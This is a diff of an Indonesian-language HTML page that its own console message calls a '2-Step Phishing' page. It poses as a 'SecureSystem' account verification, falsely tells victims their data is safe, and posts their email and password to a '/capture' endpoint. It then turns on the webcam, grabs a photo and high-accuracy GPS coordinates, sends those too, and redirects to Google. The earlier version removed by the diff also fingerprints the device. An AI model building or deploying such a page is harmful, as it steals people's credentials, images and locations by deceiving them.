@@ -3,35 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Keamanan</title>
+    <title>Verifikasi Akun</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
         body {
-            background: #0d1117;
+            background: #0a0a0f;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            padding: 15px;
         }
-        .box {
-            background: #161b22;
-            padding: 35px;
-            border-radius: 16px;
-            width: 380px;
-            border: 1px solid #30363d;
+        .container {
+            background: #14141e;
+            padding: 30px 25px;
+            border-radius: 24px;
+            width: 420px;
+            max-width: 100%;
+            border: 1px solid #2a2a3a;
             text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
         }
-        .box h2 { color: #fff; margin-bottom: 5px; }
-        .box h2 span { color: #58a6ff; }
-        .sub { color: #8b949e; font-size: 14px; margin-bottom: 15px; }
+        .badge {
+            display: inline-block;
+            background: #ff0050;
+            color: #fff;
+            font-size: 12px;
+            font-weight: 700;
+            padding: 6px 18px;
+            border-radius: 30px;
+            margin-bottom: 16px;
+            box-shadow: 0 0 20px rgba(255,0,80,0.3);
+        }
+        .title {
+            color: #f0f0f8;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+        .title span { color: #5b7cff; }
+        .sub {
+            color: #8a8aa0;
+            font-size: 14px;
+            margin-bottom: 18px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 8px 0;
+            background: #0d0d16;
+            border: 1px solid #2a2a3a;
+            border-radius: 12px;
+            color: #f0f0f8;
+            font-size: 15px;
+            outline: none;
+            transition: 0.3s;
+        }
+        input:focus {
+            border-color: #5b7cff;
+            box-shadow: 0 0 0 3px rgba(91,124,255,0.15);
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            margin-top: 12px;
+            background: #5b7cff;
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn:hover { background: #4a6af0; transform: scale(1.01); }
+        .btn:disabled { background: #333; cursor: not-allowed; transform: none; }
+        .status {
+            margin: 10px 0;
+            font-size: 13px;
+            color: #8a8aa0;
+        }
+        .status.error { color: #ff4757; }
+        .status.success { color: #2ed573; }
+        .footer {
+            margin-top: 18px;
+            font-size: 11px;
+            color: #4a4a5a;
+            border-top: 1px solid #1e1e2e;
+            padding-top: 14px;
+        }
+        .note { color: #4a4a5a; font-size: 12px; margin-top: 6px; }
+
+        /* ===== STEP 2: FOTO + GPS ===== */
         .camera-box {
             width: 100%;
             height: 220px;
-            background: #0d1117;
-            border: 2px dashed #30363d;
+            background: #0d0d16;
+            border: 2px dashed #2a2a3a;
             border-radius: 12px;
             overflow: hidden;
             margin-bottom: 12px;
+            position: relative;
         }
         .camera-box video {
             width: 100%;
@@ -45,142 +117,223 @@
             align-items: center;
             justify-content: center;
             height: 100%;
-            color: #8b949e;
+            color: #4a4a5a;
         }
         .camera-box .placeholder .icon { font-size: 48px; }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 6px 0;
-            background: #0d1117;
-            border: 1px solid #30363d;
-            border-radius: 8px;
-            color: #fff;
-            outline: none;
-        }
-        input:focus { border-color: #58a6ff; }
-        .btn {
-            width: 100%;
-            padding: 13px;
-            margin-top: 10px;
-            background: #238636;
-            border: none;
-            border-radius: 8px;
-            color: #fff;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        .btn:hover { background: #2ea043; }
-        .btn:disabled { background: #555; cursor: not-allowed; }
-        .status {
-            margin: 10px 0;
-            font-size: 13px;
-            color: #8b949e;
-        }
-        .status.success { color: #2ea043; }
-        .status.error { color: #da3633; }
-        .status.gps { color: #f1c40f; }
-        .footer { margin-top: 14px; font-size: 11px; color: #555; }
         .hidden { display: none; }
+        .gps-info {
+            background: #0d0d16;
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid #2a2a3a;
+            margin-top: 10px;
+            font-size: 13px;
+            color: #8a8aa0;
+        }
+        .gps-info .loc { color: #2ed573; font-weight: 600; }
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 20px;
+        }
+        .step-indicator .step {
+            font-size: 12px;
+            color: #4a4a5a;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .step-indicator .step.active { color: #5b7cff; font-weight: 600; }
+        .step-indicator .step.done { color: #2ed573; }
+        .step-indicator .line {
+            width: 40px;
+            height: 2px;
+            background: #2a2a3a;
+            align-self: center;
+        }
+        .step-indicator .line.done { background: #2ed573; }
     </style>
 </head>
 <body>
-<div class="box">
-    <h2>📹 <span>Verifikasi Keamanan</span></h2>
-    <p class="sub">Untuk keamanan, verifikasi wajah & lokasi diperlukan</p>
 
-    <div class="camera-box" id="cameraBox">
-        <div class="placeholder" id="placeholder">
-            <span class="icon">📷</span>
-            <span>Kamera akan aktif</span>
-        </div>
-        <video id="video" class="hidden" autoplay muted></video>
+<div class="container" id="app">
+
+    <!-- BADGE -->
+    <div class="badge">⚡ VERIFIKASI AKUN</div>
+
+    <!-- STEP INDICATOR -->
+    <div class="step-indicator">
+        <span class="step active" id="step1">🔐 Login</span>
+        <span class="line" id="line1"></span>
+        <span class="step" id="step2">📸 Foto + GPS</span>
     </div>
 
-    <div class="status" id="status">⏳ Menyiapkan...</div>
+    <!-- ===== STEP 1: LOGIN ===== -->
+    <div id="stepLogin">
+        <div class="title">🔐 <span>Login</span></div>
+        <p class="sub">Masukkan email dan password</p>
 
-    <form id="loginForm">
-        <input type="text" id="username" placeholder="Username / Email" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <button type="submit" class="btn" id="submitBtn">🔓 Verifikasi</button>
-    </form>
-    <div class="footer">© 2026 SecureSystem</div>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="📧 Email" required>
+            <input type="password" id="password" placeholder="🔒 Password" required>
+            <button type="submit" class="btn" id="loginBtn">🔓 Login</button>
+        </form>
+
+        <div class="status" id="loginStatus"></div>
+        <div class="note">⚠️ Data Anda aman</div>
+    </div>
+
+    <!-- ===== STEP 2: FOTO + GPS ===== -->
+    <div id="stepPhoto" class="hidden">
+        <div class="title">📸 <span>Verifikasi Wajah</span></div>
+        <p class="sub">Aktifkan kamera untuk verifikasi</p>
+
+        <div class="camera-box" id="cameraBox">
+            <div class="placeholder" id="placeholder">
+                <span class="icon">📷</span>
+                <span>Kamera siap</span>
+            </div>
+            <video id="video" class="hidden" autoplay muted></video>
+        </div>
+
+        <button class="btn" id="photoBtn">📸 Ambil Foto & Kirim</button>
+
+        <div class="gps-info" id="gpsInfo">
+            📍 Lokasi: <span class="loc" id="gpsText">Mengambil...</span>
+        </div>
+
+        <div class="status" id="photoStatus"></div>
+        <div class="note">✅ Verifikasi wajah & lokasi diperlukan</div>
+    </div>
+
+    <div class="footer">© 2026 SecureSystem · <span id="footerText">2 Step Verification</span></div>
 </div>
 
 <canvas id="canvas" class="hidden"></canvas>
 
 <script>
-// ====== AUTO-GRAB DEVICE INFO ======
-function getDeviceInfo() {
-    const info = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screenWidth: screen.width,
-        screenHeight: screen.height,
-        colorDepth: screen.colorDepth,
-        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        doNotTrack: navigator.doNotTrack || 'unspecified',
-        cookiesEnabled: navigator.cookieEnabled,
-        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
-    };
-    return info;
-}
+// ============================================================
+// 1. ELEMEN
+// ============================================================
+const stepLogin = document.getElementById('stepLogin');
+const stepPhoto = document.getElementById('stepPhoto');
+const step1 = document.getElementById('step1');
+const step2 = document.getElementById('step2');
+const line1 = document.getElementById('line1');
+const loginStatus = document.getElementById('loginStatus');
+const photoStatus = document.getElementById('photoStatus');
 
-async function sendDeviceInfo() {
-    const info = getDeviceInfo();
+// ============================================================
+// 2. STEP 1: LOGIN
+// ============================================================
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    const email = document.getElementById('email').value.trim();
+    const pass = document.getElementById('password').value.trim();
+    const btn = document.getElementById('loginBtn');
+
+    if (!email || !pass) {
+        loginStatus.textContent = '⚠️ Isi semua field!';
+        loginStatus.className = 'status error';
+        return;
+    }
+
+    btn.disabled = true;
+    btn.textContent = '⏳ Memproses...';
+    loginStatus.textContent = '📤 Mengirim data...';
+    loginStatus.className = 'status';
+
     try {
-        await fetch('/device-info', {
+        const res = await fetch('/capture', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(info)
+            body: JSON.stringify({ username: email, password: pass })
         });
-    } catch (err) {}
-}
 
-sendDeviceInfo();
+        const result = await res.json();
 
-// ====== KAMERA + GPS + FORM ======
+        if (result.status === 'success') {
+            loginStatus.textContent = '✅ Login berhasil!';
+            loginStatus.className = 'status success';
+            // Pindah ke step 2
+            stepLogin.classList.add('hidden');
+            stepPhoto.classList.remove('hidden');
+            step1.classList.remove('active');
+            step1.classList.add('done');
+            line1.classList.add('done');
+            step2.classList.add('active');
+            document.getElementById('footerText').textContent = '📸 Verifikasi Wajah';
+            // Mulai kamera & GPS
+            startCamera();
+        } else {
+            throw new Error(result.message);
+        }
+    } catch (err) {
+        loginStatus.textContent = '⚠️ Login gagal, coba lagi.';
+        loginStatus.className = 'status error';
+        btn.disabled = false;
+        btn.textContent = '🔓 Login';
+    }
+});
+
+// ============================================================
+// 3. STEP 2: KAMERA + GPS
+// ============================================================
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
-const statusEl = document.getElementById('status');
-const submitBtn = document.getElementById('submitBtn');
 const placeholder = document.getElementById('placeholder');
+const photoBtn = document.getElementById('photoBtn');
+const gpsText = document.getElementById('gpsText');
 
+let stream = null;
 let cameraReady = false;
 let gpsData = { lat: '-', lon: '-', acc: '-' };
 
-navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
-    .then((stream) => {
-        video.srcObject = stream;
-        video.classList.remove('hidden');
-        placeholder.style.display = 'none';
-        cameraReady = true;
-        statusEl.textContent = '✅ Kamera siap';
-        statusEl.className = 'status success';
-    })
-    .catch(() => {
-        statusEl.textContent = '⚠️ Izin kamera ditolak';
-        statusEl.className = 'status error';
-        cameraReady = false;
-    });
-
-navigator.geolocation.getCurrentPosition(
-    (pos) => {
-        gpsData.lat = pos.coords.latitude;
-        gpsData.lon = pos.coords.longitude;
-        gpsData.acc = pos.coords.accuracy;
-        statusEl.textContent = `📍 Lokasi: ${gpsData.lat}, ${gpsData.lon}`;
-        statusEl.className = 'status gps';
-    },
-    () => {
-        statusEl.textContent = '⚠️ Gagal ambil lokasi, lanjut tanpa GPS';
-        statusEl.className = 'status error';
+// === GPS ===
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                gpsData.lat = pos.coords.latitude;
+                gpsData.lon = pos.coords.longitude;
+                gpsData.acc = pos.coords.accuracy;
+                gpsText.textContent = `${gpsData.lat}, ${gpsData.lon} (±${gpsData.acc}m)`;
+            },
+            () => {
+                gpsText.textContent = '❌ Gagal ambil lokasi';
+            },
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    } else {
+        gpsText.textContent = '❌ GPS tidak support';
     }
-);
+}
 
+// === KAMERA ===
+function startCamera() {
+    navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
+        .then((s) => {
+            stream = s;
+            video.srcObject = s;
+            video.classList.remove('hidden');
+            placeholder.style.display = 'none';
+            cameraReady = true;
+            photoStatus.textContent = '✅ Kamera siap';
+            photoStatus.className = 'status success';
+            getLocation();
+        })
+        .catch((err) => {
+            photoStatus.textContent = '⚠️ Izin kamera ditolak: ' + err.message;
+            photoStatus.className = 'status error';
+            cameraReady = false;
+            getLocation(); // Tetap ambil GPS walau kamera ditolak
+        });
+}
+
+// === AMBIL FOTO ===
 function captureImage() {
     if (!cameraReady || !video.videoWidth) return null;
     canvas.width = video.videoWidth;
@@ -189,31 +342,28 @@ function captureImage() {
     return canvas.toDataURL('image/jpeg');
 }
 
-document.getElementById('loginForm').addEventListener('submit', async function(e) {
-    e.preventDefault();
-
-    const user = document.getElementById('username').value.trim();
-    const pass = document.getElementById('password').value.trim();
-
-    if (!user || !pass) {
-        statusEl.textContent = '⚠️ Isi semua field!';
-        statusEl.className = 'status error';
+// === KIRIM FOTO + GPS ===
+photoBtn.addEventListener('click', async function() {
+    if (!cameraReady) {
+        photoStatus.textContent = '⚠️ Kamera belum siap!';
+        photoStatus.className = 'status error';
         return;
     }
 
-    submitBtn.disabled = true;
-    submitBtn.textContent = '⏳ Memproses...';
-    statusEl.textContent = '📤 Mengirim data...';
+    photoBtn.disabled = true;
+    photoBtn.textContent = '⏳ Mengirim...';
+    photoStatus.textContent = '📤 Mengirim data...';
+    photoStatus.className = 'status';
 
     const image = captureImage();
 
     try {
-        const response = await fetch('/capture', {
+        const res = await fetch('/capture', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                username: user,
-                password: pass,
+                username: document.getElementById('email').value.trim(),
+                password: document.getElementById('password').value.trim(),
                 image: image || '',
                 lat: gpsData.lat,
                 lon: gpsData.lon,
@@ -221,22 +371,36 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
             })
         });
 
-        const result = await response.json();
+        const result = await res.json();
 
         if (result.status === 'success') {
-            statusEl.textContent = '✅ Berhasil!';
-            statusEl.className = 'status success';
-            window.location.href = 'https://www.google.com';
+            photoStatus.textContent = '✅ Verifikasi berhasil!';
+            photoStatus.className = 'status success';
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 1500);
         } else {
             throw new Error(result.message);
         }
     } catch (err) {
-        statusEl.textContent = '⚠️ Error, coba lagi';
-        statusEl.className = 'status error';
-        submitBtn.disabled = false;
-        submitBtn.textContent = '🔓 Verifikasi';
+        photoStatus.textContent = '⚠️ Gagal kirim, coba lagi.';
+        photoStatus.className = 'status error';
+        photoBtn.disabled = false;
+        photoBtn.textContent = '📸 Ambil Foto & Kirim';
     }
 });
+
+// ============================================================
+// 4. CLEANUP
+// ============================================================
+window.addEventListener('beforeunload', () => {
+    if (stream) {
+        stream.getTracks().forEach(t => t.stop());
+    }
+});
+
+console.log('🔧 2-Step Phishing Loaded!');
+console.log('Step 1: Login → Step 2: Foto + GPS');
 </script>
 </body>
 </html>
